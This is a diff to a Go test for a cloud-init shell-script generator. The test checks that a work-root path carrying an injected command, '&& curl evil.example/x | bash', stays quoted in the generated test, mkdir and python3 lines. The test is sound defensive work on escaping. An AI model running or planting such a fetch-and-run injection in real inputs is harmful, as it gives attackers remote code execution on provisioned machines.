@@ -162,7 +162,7 @@ func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
 	for _, want := range []string{
 		"test -w '/work/crabbox && curl evil.example/x | bash'",
 		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
-		"chown -R 'crabbox':'crabbox' '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox",
+		"python3 -I - 'crabbox' '/work/crabbox && curl evil.example/x | bash' '/var/cache/crabbox' ",
 	} {
 		if !strings.Contains(got, want) {
 			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
